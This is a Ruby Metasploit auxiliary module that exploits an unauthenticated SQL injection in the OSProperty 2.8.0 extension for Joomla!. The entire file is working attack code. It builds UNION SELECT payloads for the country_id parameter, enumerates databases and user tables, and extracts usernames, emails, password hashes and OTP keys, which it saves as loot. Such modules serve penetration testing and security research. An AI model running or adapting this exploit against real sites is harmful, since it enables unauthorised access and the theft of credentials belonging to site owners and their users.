##
# This module requires Metasploit: http://metasploit.com/download
## Current source: https://github.com/rapid7/metasploit-framework
###

require 'msf/core'
require 'json'

class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient

  def initialize(info={})
    super(update_info(info,
      'Name'           => "OS Solution OSProperty 2.8.0 for Joomla! Unauthenticated SQL Injection User Enumeration",
      'Description'    => %q{
      This module will exploit an unauthenticated SQL injection in OS Solution OSProperty 2.8.0
      for Joomla! in order to enumerate usernames and password hashes from the Joomla! database
      },
      'License'        => 'ExploitHub',
      'Author'         =>
        [
          'Brandon Perry <bperry.volatile[at]gmail.com>' #meatpistol module
        ],
      'References'     =>
        [
          ['URL', 'https://www.exploit-db.com/exploits/36862/']
        ],
      'Platform'       => ['win', 'linux'],
      'Privileged'     => false,
      'DisclosureDate' => "Apr 29 2015"))

      register_options(
      [
        OptString.new('TARGETURI', [ true, 'Relative URI of Joomla! installation', '/']),
      ], self.class)
  end

  def run
    left_marker = Rex::Text.rand_text_alpha(5)
    right_marker = Rex::Text.rand_text_alpha(5)

    get_dbs = "UNION ALL SELECT NULL,CONCAT(0x#{left_marker.unpack("H*")[0]},IFNULL(CAST(schema_name AS CHAR),0x20),0x#{right_marker.unpack("H*")[0]}) FROM INFORMATION_SCHEMA.SCHEMATA#"

    res = send_injected_request(get_dbs)

    if res.nil? or res.body.nil?
      fail_with(Failure::Unknown, "Server did not respond in an expected way")
    end

    matches = res.body.scan(/#{left_marker}(.*)#{right_marker}/)

    dbs = []
    matches.uniq.each do |match|
      dbs << match[0]
    end

    dbs.delete("performance_schema")
    dbs.delete("mysql")
    dbs.delete("information_schema")

    users = []
    dbs.each do |db|
      get_tables = "UNION ALL SELECT NULL,CONCAT(0x#{left_marker.unpack("H*")[0]},IFNULL(CAST(table_name AS CHAR),0x20),0x#{right_marker.unpack("H*")[0]}) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema IN (0x#{db.unpack("H*")[0]})#"

      res = send_injected_request(get_tables)

      if res.nil? or res.body.nil?
        fail_with(Failure::Unknown, "Server did not respond in an expected way")
      end

      matches = res.body.scan(/#{left_marker}(.*)#{right_marker}/)

      tables = []
      matches.uniq.each do |match|
        tables << match[0] if match[0] =~ /users$/
      end

      tables.each do |table|
        get_users = "UNION ALL SELECT NULL,CONCAT(0x#{left_marker.unpack("H*")[0]},IFNULL(CAST(activation AS CHAR),0x20),0x#{right_marker.unpack("H*")[0]},IFNULL(CAST(block AS CHAR),0x20),0x#{right_marker.unpack("H*")[0]},IFNULL(CAST(email AS CHAR),0x20),0x#{right_marker.unpack("H*")[0]},IFNULL(CAST(id AS CHAR),0x20),0x#{right_marker.unpack("H*")[0]},IFNULL(CAST(lastResetTime AS CHAR),0x20),0x#{right_marker.unpack("H*")[0]},IFNULL(CAST(lastvisitDate AS CHAR),0x20),0x#{right_marker.unpack("H*")[0]},IFNULL(CAST(name AS CHAR),0x20),0x#{right_marker.unpack("H*")[0]},IFNULL(CAST(otep AS CHAR),0x20),0x#{right_marker.unpack("H*")[0]},IFNULL(CAST(otpKey AS CHAR),0x20),0x#{right_marker.unpack("H*")[0]},IFNULL(CAST(params AS CHAR),0x20),0x#{right_marker.unpack("H*")[0]},IFNULL(CAST(password AS CHAR),0x20),0x#{right_marker.unpack("H*")[0]},IFNULL(CAST(registerDate AS CHAR),0x20),0x#{right_marker.unpack("H*")[0]},IFNULL(CAST(requireReset AS CHAR),0x20),0x#{right_marker.unpack("H*")[0]},IFNULL(CAST(resetCount AS CHAR),0x20),0x#{right_marker.unpack("H*")[0]},IFNULL(CAST(sendEmail AS CHAR),0x20),0x#{right_marker.unpack("H*")[0]},IFNULL(CAST(username AS CHAR),0x20),0x#{left_marker.unpack("H*")[0]}) FROM #{db}.#{table}#"

        res = send_injected_request(get_users)

        if res.nil? or res.body.nil?
          fail_with(Failure::Unknown, "Server did not respond in an expected way")
        end

        matches = res.body.scan(/#{left_marker}(.*?)#{right_marker}(.*?)#{right_marker}(.*?)#{right_marker}(.*?)#{right_marker}(.*?)#{right_marker}(.*?)#{right_marker}(.*?)#{right_marker}(.*?)#{right_marker}(.*?)#{right_marker}(.*?)#{right_marker}(.*?)#{right_marker}(.*?)#{right_marker}(.*?)#{right_marker}(.*?)#{right_marker}(.*?)#{right_marker}(.*?)#{left_marker}/)

        matches.each do |match|
          user = {}
          user["activation"] = match[0]
          user["block"] = match[1]
          user["email"] = match[2]
          user["id"] = match[3]
          user["lastResetTime"] = match[4]
          user["lastVisitDate"] = match[5]
          user["name"] = match[6]
          user["otep"] = match[7]
          user["otpKey"] = match[8]
          user["params"] = match[9]
          user["password"] = match[10]
          user["registerDate"] = match[11]
          user["requireReset"] = match[12]
          user["resetCount"] = match[13]
          user["sendEmail"] = match[14]
          user["username"] = match[15]

          users << user
        end
      end
    end
    path = store_loot("joomla.users", "text/plain", datastore['RHOST'], users.to_json, 'joomla.users')
    print_good("Users saved to file: " + path)
  end

  def send_injected_request(payload)
    return send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'index.php'),
      'vars_get' => {
        'option' => 'com_osproperty',
        'no_html' => 1,
        'tmpl' => 'component',
        'task' => 'ajax_loadStateInListPage',
        'country_id' => "1' " + payload
      }
    })
  end
end
